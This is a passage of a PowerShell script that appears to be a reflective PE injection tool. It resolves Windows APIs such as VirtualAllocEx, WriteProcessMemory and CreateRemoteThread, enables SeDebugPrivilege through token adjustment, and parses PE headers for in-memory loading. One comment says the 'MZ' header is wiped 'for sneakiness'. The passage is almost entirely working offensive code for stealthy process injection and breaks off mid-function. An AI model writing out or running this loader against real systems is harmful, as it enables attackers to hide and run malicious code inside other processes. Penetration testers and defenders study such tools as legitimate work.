        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

        $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $LocalFreeDelegate = Get-DelegateType @([IntPtr])
        $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

        return $Win32Functions
    }
    #####################################


    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }


                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }


    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }


    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

        $PEEndAddress = $PEInfo.EndAddress

        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }


    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )

        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }


    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }


    Function Invoke-CreateRemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )

        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }

        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }

        return $RemoteThreadHandle
    }



    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $NtHeadersInfo = New-Object System.Object

        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)

        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $PEInfo = New-Object System.Object

        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null

        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types

        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
